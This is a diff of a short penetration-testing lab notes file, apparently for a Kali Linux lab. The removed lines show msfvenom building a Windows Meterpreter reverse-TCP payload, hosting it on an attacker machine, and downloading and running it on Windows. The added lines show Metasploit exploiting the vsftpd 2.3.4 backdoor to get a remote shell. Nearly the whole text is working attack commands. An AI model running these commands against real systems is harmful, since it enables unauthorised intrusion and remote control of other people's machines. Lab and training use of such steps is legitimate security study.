@@ -1,8 +1,15 @@
-Commands: 
-1. Generate Windows payload on Kali:
-   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali_IP> LPORT=5555 -f exe > shell.exe
-2. Host the payload on Kali:
-    python3 -m http.server 8080
-3. Download & execute on Windows:
-    Invoke-WebRequest -Uri http://<Kali_IP>:8080/shell.exe -OutFile shell.exe
-4. .\shell.exe
+1. Open Terminal and start Metasploit:
+   msfconsole
+2. Search for the vsftpd 2.3.4 exploit:
+   search vsftpd 2.3.4
+3. Select the appropriate exploit module:
+   use exploit/unix/ftp/vsftpd_234_backdoor
+4. Show available payloads:
+   show payloads
+5. Set the required options (replace RHOSTS with target IP):
+   set RHOSTS <target_IP>
+   set RPORT 21
+6. Set a payload
+   set payload cmd/unix/interact
+7. Run the exploit:
+   exploit
